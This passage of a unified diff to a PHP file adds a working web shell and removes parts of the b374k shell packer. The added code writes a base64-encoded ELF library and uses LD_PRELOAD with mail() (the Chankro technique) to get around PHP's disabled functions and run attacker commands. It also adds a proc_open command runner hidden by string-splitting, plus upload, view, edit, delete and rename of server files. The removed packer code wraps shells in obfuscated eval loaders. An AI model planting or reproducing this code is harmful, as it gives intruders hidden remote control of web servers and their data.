AAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAAR0NDOiAoRGViaWFuIDYuMy4wLTE4K2RlYjl1MSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAIDiAAAAAAAAAAAAAAAAAAAAAAAAMAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAMAFAAYDiAAAAAAAAAAAAAAAAAAAAAAAAMAFQDYDyAAAAAAAAAAAAAAAAAAAAAAAAMAFgAAECAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgECAAAAAAAAAAAAAAAAAAAAAAAAMAGABoECAAAAAAAAAAAAAAAAAAAAAAAAMAGQAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAASAEAABIADAAUCQAAAAAAACkAAAAAAAAAUgEAABIADQBcCQAAAAAAAAAAAAAAAAAAWAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAbAEAABIADADgCAAAAAAAADQAAAAAAAAAcAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAhAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAkwEAABIADAA9CQAAAAAAAB0AAAAAAAAAnQEAABAAGABwECAAAAAAAAAAAAAAAAAAogEAABAAGABoECAAAAAAAAAAAAAAAAAArgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAwQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA1QEAABIAAAAAAAAAAAAAAAAAAAAAAAAA6wEAABIAAAAAAAAAAAAAAAAAAAAAAAAA/QEAACAAAAAAAAAAAAAAAAAAAAAAAAAAFwIAACIAAAAAAAAAAAAAAAAAAAAAAAAAMwIAABIACQAYBwAAAAAAAAAAAAAAAAAAOQIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuNjk3MgBfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1teQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAaG9vay5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AZ2V0ZW52QEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAGRhZW1vbml6ZQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AHB3bgBzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAHByZWxvYWRtZQBfZW5kAF9fYnNzX3N0YXJ0AGNobW9kQEBHTElCQ18yLjIuNQBfSnZfUmVnaXN0ZXJDbGFzc2VzAHVuc2V0ZW52QEBHTElCQ18yLjIuNQBleGl0QEBHTElCQ18yLjIuNQBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEBHTElCQ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';
+        $cmdd = $_POST['cmd_input'];
+        $meterpreter = $en($cmdd." > test.txt");
+        $viewCommandResult = '<hr><p>Result: <font color="black">base64 : ' . $meterpreter .'</br>Please Refresh and Check File test.txt, this output command<br>test.txt created = VULN<br>test.txt not created = NOT VULN<br>example access: domain.com/yourpath/path/test.txt<br>Powered By HaxorSecurity</font><br><br></textarea>';        
+        $a($full . '/chankro.so', $base($hook));
+        $a($full . '/acpid.socket', $base($meterpreter));
+        $p('CHANKRO=' . $full . '/acpid.socket');
+        $p('LD_PRELOAD=' . $full . '/chankro.so');
+        if(function_exists('mail')) {
+            $m('a','a','a','a');
+        } elseif(function_exists('mb_send_mail')) {
+            $mb('a','a','a','a'); 
+        } elseif(function_exists('error_log')) {
+            $err('a',1,'a');
+        } elseif(function_exists('imap_mail')) {
+            $imp('a','a','a');
+        }
+
+    }elseif (isset($_POST['delete_file'])) {
+        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
+        if (file_exists($fileToDelete)) {
+            if (is_dir($fileToDelete)) {
+                if (deleteDirectory($fileToDelete)) {
+                    echo '<hr>Folder deleted successfully!';
+                } else {
+                    echo '<hr>Error: Failed to delete folder!';
+                }
+            } else {
+                if ($unl($fileToDelete)) {
+                    echo '<hr>File deleted successfully!';
+                } else {
+                    echo '<hr>Error: Failed to delete file!';
+                }
+            }
+        } else {
+            echo '<hr>Error: File or directory not found!';
+        }
+    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
+        $oldName = $currentDirectory . '/' . $_POST['old_name'];
+        $newName = $currentDirectory . '/' . $_POST['new_name'];
+        if (file_exists($oldName)) {
+            if (rename($oldName, $newName)) {
+                echo '<hr>Item renamed successfully!';
+            } else {
+                echo '<hr>Error: Failed to rename item!';
+            }
+        } else {
+            echo '<hr>Error: Item not found!';
+        }
+    }elseif (isset($_POST['cmd_biasa'])) {
+            $pp = "p"."r"."o"."c"."_"."o"."p"."e"."n";
+            $pc = "f"."c"."l"."o"."s"."e";
+            $ppc = "p"."r"."o"."c"."_"."c"."l"."o"."s"."e";
+            $stg = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
+            $command = $_POST['cmd_biasa'];
+            $descriptorspec = [
+                0 => ['pipe', 'r'],
+                1 => ['pipe', 'w'],
+                2 => ['pipe', 'w']
+            ];
+            $process = $pp($command, $descriptorspec, $pipes);
+            if (is_resource($process)) {
+                $output = $stg($pipes[1]);
+                $errors = $stg($pipes[2]);
+                $pc($pipes[1]);
+                $pc($pipes[2]);
+                $ppc($process);
+                if (!empty($errors)) {
+                    $viewCommandResult = '<hr><p>Error: </p><textarea class="result-box">' . $htm($errors) . '</textarea>';
+                } else {
+                    $viewCommandResult = '<hr><p>Result: </p><textarea class="result-box">' . $htm($output) . '</textarea>';
+                }
+            } else {
+                $viewCommandResult = 'Result:</p><textarea class="result-box">Error: Failed to execute command! </textarea>';
+            }
+    } elseif (isset($_POST['view_file'])) {
+        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
+        if (file_exists($fileToView)) {
+            $fileContent = $fgc($fileToView);
+            $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p>
+            <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
+            <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
+            <input type="hidden" name="edit_file" value="' . $_POST['view_file'] . '">
+            <input type="submit" value=" Save "></form></td>';
+        } else {
+            $viewCommandResult = '<hr><p>Error: File not found!</p>';
+        }
+    }  elseif (isset($_POST['edit_file'])) {
+        $ef = $currentDirectory . '/' . $_POST['edit_file'];
+        $newContent = $_POST['content'];
+        if ($fpc($ef, $newContent) !== false) {
+            echo '<hr>File Edited successfully! ' . $_POST['edit_file'].'<hr>';
+        } else {
+            echo '<hr>Error: Failed Edit File! ' . $_POST['edit_file'].'<hr>';
+
+        }
+    }
+
 }
 
-function packer_get_post(){
-	return packer_fix_magic_quote($_POST);
+echo '<hr>DIR: ';
+
+$directories = $expl(DIRECTORY_SEPARATOR, $currentDirectory);
+$currentPath = '';
+$homeLinkPrinted = false;
+foreach ($directories as $index => $dir) {
+    $currentPath .= DIRECTORY_SEPARATOR . $dir;
+    if ($index == 0) {
+        echo '/<a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
+    } else {
+        echo '/<a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
+    }
 }
 
-function packer_fix_magic_quote($arr){
-	$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
-	if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){
-		if(is_array($arr)){
-			foreach($arr as $k=>$v){
-				if(is_array($v)) $arr[$k] = clean($v);
-				else $arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off')? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v));
-			}
-		}
-	}
-	return $arr;
+echo '<a href="?d=' . x($scriptDirectory) . '"> / <span style="color: green;">[ GO Home ]</span></a>';
+echo '<br>';
+echo '<hr><form method="post" enctype="multipart/form-data">';
+echo '<hr>';
+echo '<input type="file" name="fileToUpload" id="fileToUpload" placeholder="pilih file:">';
+echo '<input type="submit" value="Upload File" name="submit">';
+echo '</form><hr>';
+echo '<table border="5"><tbody>
+<tr>
+<td>
+<center>Command BYPASS<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
+<input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form></center></td>
+
+<td><center>Command BIASA<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
+<input type="text" name="cmd_biasa" placeholder="Enter command"><input type="submit" value="Run Command"></form><center></td>
+
+<td><center>Create Folder<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
+<input type="text" name="folder_name" placeholder="Folder Name"><input type="submit" value="Create Folder"></form><center></td>
+<td><center>Create File<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
+<input type="text" name="file_name" placeholder="File Name"><input type="submit" value="Create File"></form></td></tr>
+</tbody></table>';
+echo $viewCommandResult;
+echo '<table border=1>';
+echo '<br><tr><th><center>Item Name</th><th><center>Size</th><th><center>Date</th><th>Permissions</th><th><center>View</th><th><center>Delete</th><th><center>Rename</th></tr></center></center></center>';
+foreach ($scd($currentDirectory) as $v) {
+    $u = $ril($v);
+    $s = $st($u);
+    $itemLink = $isdir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?'.('d='.x($currentDirectory).'&f='.x($v));
+    $permission = substr(sprintf('%o', fileperms($u)), -4);
+    $writable = $isw($u);
+    echo '<tr>
+            <td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td>
+            <td class="size">'.filesize($u).'</td>
+            <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', filemtime($u)).'</td>
+            <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
+            <td><center><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.$htm($v).'"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.$htm($v).'"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.$htm($v).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr>';
+        
 }
 
-function packer_html_safe($str){
-	return htmlspecialchars($str, 2 | 1);
+echo "</table><center><img src='https://cdn.privdayz.com/images/logo.jpg' height='15' width='75' referrerpolicy='unsafe-url' /></center>";
+function deleteDirectory($dir) {
+   $unl = "u"."n"."l"."i"."n"."k";
+    if (!file_exists($dir)) {
+        return true;
+    }
+    if (!is_dir($dir)) {
+        return $unl($dir);
+    }
+    $scd = "s"."c"."a"."n"."d"."i"."r";
+    foreach ($scd($dir) as $item) {
+        if ($item == '.' || $item == '..') {
+            continue;
+        }
+        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
+            return false;
+        }
+    }
+    return rmdir($dir);
 }
-
-function packer_wrap_with_quote($str){
-	return "\"".$str."\"";
-}
-
-function packer_output($str){
-	header("Content-Type: text/plain");
-	header("Cache-Control: no-cache");
-	header("Pragma: no-cache");
-	echo $str;
-	die();
-}
-
-function packer_get_self(){
-	$query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:"";
-	return packer_html_safe($_SERVER["REQUEST_URI"].$query);
-}
-
-function packer_strips($str){
-	$newStr = '';
-
-	$commentTokens = array(T_COMMENT);
-
-	if(defined('T_DOC_COMMENT')) $commentTokens[] = T_DOC_COMMENT;
-	if(defined('T_ML_COMMENT'))	$commentTokens[] = T_ML_COMMENT;
-
-	$tokens = token_get_all($str);
-
-	foreach($tokens as $token){
-		if (is_array($token)) {
-			if (in_array($token[0], $commentTokens)) continue;
-			$token = $token[1];
-		}
-	$newStr .= $token;
-	}
-	$newStr = preg_replace("/(\s{2,})/", " ", $newStr);
-	return $newStr;
-}
-
-function packer_get_theme(){
-	$available_themes = array();
-	foreach(glob($GLOBALS['packer']['theme_dir']."*.css") as $filename){
-		$filename = basename($filename, ".css");
-		$available_themes[] = $filename;
-	}
-	return $available_themes;
-}
-
-function packer_get_module(){
-	$available_modules = array();
-	foreach(glob($GLOBALS['packer']['module_dir']."*.php") as $filename){
-		$filename = basename($filename, ".php");
-		if(packer_check_module($filename)) $available_modules[] = $filename;
-	}
-	return $available_modules;
-}
-
-function packer_check_module($module){
-	$filename = $GLOBALS['packer']['module_dir'].$module;
-	if(is_file($filename.".php")){
-		$content = packer_read_file($filename.".php");
-		@eval("?>".$content);
-		if($GLOBALS['module'][$module]['id']==$module) return true;
-	}
-	return false;
-}
-
-function packer_pack_js($str){
-	$packer = new JavaScriptPacker($str, 0, true, false);
-	return $packer->pack();
-}
-
-function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password){
-	$content = "";
-	if(is_file($output)){
-		if(!is_writable($output)) return "error : file ".$output." exists and is not writable{[|b374k|]}";
-	}
-
-	if(!empty($password)) $password = "\$GLOBALS['pass'] = \"".sha1(md5($password))."\"; // sha1(md5(pass))\n";
-
-	$compress_level = (int) $compress_level;
-	if($compress_level<0) $compress_level = 0;
-	elseif($compress_level>9) $compress_level = 9;
-
-	$version = "";
-	if(preg_match("/\\\$GLOBALS\['ver'\]\ *=\ *[\"']+([^\"']+)[\"']+/", $phpcode, $r)){
-		$version = $r[1];
-	}
-	
-	$header = "<?php
-/*
-	b374k shell ".$version."
-	Jayalah Indonesiaku
-	(c)".@date("Y",time())."
-	https://github.com/b374k/b374k
-
-*/\n";
-
-
-	if($strip=='yes'){
-		$phpcode = packer_strips($phpcode);
-		$htmlcode = preg_replace("/(\ {2,}|\n{2,}|\t+)/", "", $htmlcode);
-		$htmlcode = preg_replace("/\r/", "", $htmlcode);
-		$htmlcode = preg_replace("/}\n+/", "}", $htmlcode);
-		$htmlcode = preg_replace("/\n+}/", "}", $htmlcode);
-		$htmlcode = preg_replace("/\n+{/", "{", $htmlcode);
-		$htmlcode = preg_replace("/\n+/", "\n", $htmlcode);
-	}
-
-
-	$content = $phpcode.$htmlcode;
-
-	if($compress=='gzdeflate'){
-		$content = gzdeflate($content, $compress_level);
-		$encoder_func = "gz'.'in'.'fla'.'te";
-	}
-	elseif($compress=='gzencode'){
-		$content = gzencode($content, $compress_level);
-		$encoder_func = "gz'.'de'.'co'.'de";
-	}
-	elseif($compress=='gzcompress'){
-		$content = gzcompress($content, $compress_level);
-		$encoder_func = "gz'.'un'.'com'.'pre'.'ss";
-	}
-	else{
-		$encoder_func = "";
-	}
-
-	if($base64=='yes'){
-		$content = base64_encode($content);
-		if($compress!='no'){
-			$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
-		}
-		else{
-			$encoder = "ba'.'se'.'64'.'_de'.'co'.'de(\"\$x\")";
-		}
-
-		$code = $header.$password."\$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";\$b374k=\$func('\$x','ev'.'al'.'(\"?>\".".$encoder.");');\$b374k(\"".$content."\");?>";
-	}
-	else{
-		if($compress!='no'){
-			$encoder = $encoder_func."(\$x)";
-		}
-		else{
-			$code = $header.$password."?>".$content;
